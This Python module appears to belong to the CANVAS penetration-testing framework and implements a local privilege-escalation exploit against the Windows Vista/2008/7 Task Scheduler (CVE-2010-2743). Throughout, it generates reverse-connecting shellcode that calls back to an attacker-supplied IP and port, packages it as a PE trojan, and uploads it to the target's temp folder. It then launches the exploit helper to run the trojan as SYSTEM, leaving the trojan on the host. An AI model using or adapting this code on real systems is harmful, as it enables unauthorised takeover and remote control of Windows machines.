#!/usr/bin/env python
#

import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from canvasexploit import canvasexploit
from exploitutils import *
import shellcode.standalone.windows.payloads as payloads
from shellcode import shellcodeGenerator
from MOSDEF import pelib


NAME                                = 'MS_TASKSCHEDULER'
VERSION                             = '1.0'
DESCRIPTION                         = 'MS Task Scheduler Crafted Signature'

DOCUMENTATION                       = {}
DOCUMENTATION['VENDOR']             = 'Microsoft'
DOCUMENTATION['Repeatability']      = 'Multiple Shot'
DOCUMENTATION['VersionsAffected']   = 'Windows'
DOCUMENTATION['CVE Name']           = 'CVE-2010-2743' # Not officially released but referenced in multiple places
DOCUMENTATION['CVE URL']            = 'http://cve.mitre.org/cgi-bin/cvename.cg?name=CVE-2010-2743' # ditto
DOCUMENTATION["Notes"]              = '''

This is one of the vulnerabilities used by the Stuxnet work to elevate
its privileges on Windows Vista and Windows 7.

This vulnerability is currently unpatched, and has been tested to be
language and service pack independent.

'''

PROPERTY                            = {}
PROPERTY['TYPE']                    = 'Exploit'
PROPERTY['SITE']                    = 'Local'
PROPERTY['ARCH']                    = [ ['Windows', 'i386', 'x64'] ]
PROPERTY['VERSION']                 = [ 'Vista', '2008', '7' ]
PROPERTY['MS PATCHES']              = ["KB2305420"]

from ExploitTypes.localexploit import LocalExploit
from engine.config import canvas_root_directory
import random


class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.TASKSCHEDULER  = [
            ('ms_taskscheduler.exe', 'ms_taskscheduler%d.exe' % random.randint(0,1000)) ]
        self.local_path     = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.remote_path    = '%TMP%\\' # remote base path
        self.trojan_name    = 'CB%d.EXE' % random.randint(0,1000)

    def get_args(self):
        """
        Retrieve and initialize arguments
        """
        self.node           = self.argsDict['passednodes'][0]
        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def init_mosdef_listener(self):
        self.get_args()

        self.log('[+] MS_TASKSCHEDULER using MOSDEF listener ...')
        self.listenerArgsDict['fromcreatethread']   = 0
        mosdef_listener = self.engine.autoListener(self, canvasengine.WIN32MOSDEF)
        mosdef_listener.argsDict           = self.listenerArgsDict
        mosdef_listener.current_exploit    = self
        if not mosdef_listener:
            self.log('[+] could not start win32 mosdef listener')
            return False
        return True

    def init_TASKSCHEDULER(self):
        """
        Uploads the TASKSCHEDULER exe
        """
        for srcfile, dstfile in self.TASKSCHEDULER:
            src = os.path.join(self.local_path, srcfile)
            dst = self.remote_path + dstfile
            try:
                self.node.shell.upload(src, destfilename = dst)
                self.log('[+] Uploaded %s to %s' % (src, dst))
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                self.log('[-] Could not upload %s to %s' % (src, dst))
                return False
        return True

    def uninit_TASKSCHEDULER(self):
        """
        Remove the TASKSCHEDULER exe/dat
        """
        for srcfile, dstfile in self.TASKSCHEDULER:
            try:
                ret = self.node.shell.unlink(self.remote_path + dstfile)
                self.log('[+] %s' % ret)
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                return False
        return True

    def spawn_TASKSCHEDULER(self, arg):
        """
        spawn TASKSCHEDULER
        """
        try:
            ret = self.node.shell.CreateProcessA(self.remote_path + self.TASKSCHEDULER[0][1] + ' ' +'"'+arg+'"',
                                                 inherithandles=1,
                                                 dwCreationFlags = 0x08000200)
            self.log(ret)
            if not ret:
                return False
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def init_callback(self):
        """
        Build + upload the MOSDEF callback trojan
        """
        if not self.callback:
            self.log('[-] No callback set!')
            return False
        trojan = ''
        try:
            sc = shellcodeGenerator.win32()
            sc.addAttr('findeipnoesp', {'subespval': 0})
            sc.addAttr('revert_to_self_before_importing_ws2_32', None)
            sc.addAttr('tcpconnect', {'port' : self.callback.port,
                                      'ipaddress' : self.callback.ip})
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
            sc.addAttr("ExitThread",None)
            sc.vAllocSelf = True #we need to move to another page!
            callback_payload = sc.get()
            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(callback_payload)

            # write out the binary
            src = os.path.join(self.local_path, self.trojan_name)
            self.log('[+] Creating callback trojan in %s' % src)
            fd = open(src, 'wb')
            fd.write(trojan)
            fd.close()
            # upload the binary
            self.log('[+] Uploading callback trojan ...')
            ret = self.node.shell.upload(src, destfilename = self.remote_path + self.trojan_name)
            self.log('[+] %s' % ret)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def run(self):

        self.get_args()

        if self.node.nodetype.lower() not in ['win32node']:
            self.log('[-] Node Type not supported ...')
            return False

        #first, we check to make sure we are not
        #already local/SYSTEM - is there a better way?
        whoami=self.exploitnodes('whoami',[self.node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log("It appears you are already running as LOCAL/SYSTEM!")
            return 1

        ret,nodeos=self.node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major<6:
            self.log('This exploit is only for Windows Vista/2008/7')
            return 0

        # init MOSDEF listener if needed
        if self.init_mosdef_listener() == False:
            return False

        self.remote_path = self.node.shell.GetTempPathA()
        if not self.remote_path:
            self.log('[-] Could not resolve full temp dir path ...')
            return False
        else:
            self.log('[-] Temp dir: %s' % self.remote_path)

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('[-] Could not chdir into %s' % self.remote_path)
            return False

        # build and upload callback trojan
        if self.init_callback() == False:
            self.log('[-] Could not init callback ...')
            return False

        # upload ms_taskscheduler binary
        if self.init_TASKSCHEDULER() == False:
            self.log('[-] Could not init TASKSCHEDULER ...')
            return False

        # spawn ms_taskscheduler
        if self.spawn_TASKSCHEDULER(self.remote_path + self.trojan_name) == False:
            self.log('[-] Could not spawn TASKSCHEDULER ...')
            return False

        self.log('[+] Sleeping 10 seconds before TASKSCHEDULER uninit ...')
        time.sleep(10)

        # remove files ... can't remove trojan (active process)
        if self.uninit_TASKSCHEDULER() == False:
            self.log('[-] Could not uninit TASKSCHEDULER...')
            return False

        self.log('[+] NOTE: %s\\%s still exists on the host!' % (self.remote_path, self.trojan_name))

        # check for callback success ...
        if self.ISucceeded():
            self.log('[+] MS_TASKSCHEDULER succeeded ...')
        else:
            self.log('[-] MS_TASKSCHEDULER failed ...')
            return False

        return True

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
